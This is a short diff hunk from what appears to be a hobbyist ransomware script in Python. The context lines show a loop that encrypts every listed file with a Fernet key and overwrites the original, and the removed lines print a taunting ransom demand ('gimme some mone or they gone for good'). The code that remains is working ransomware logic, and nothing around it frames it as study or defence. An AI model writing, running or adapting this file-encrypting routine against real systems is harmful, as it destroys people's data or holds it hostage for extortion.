@@ -23,6 +23,3 @@ for file in files :
     encrypted_lol = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(encrypted_lol)
-
-print("lmao ur files are ded now")
-print("gimme some mone or they gone for good")
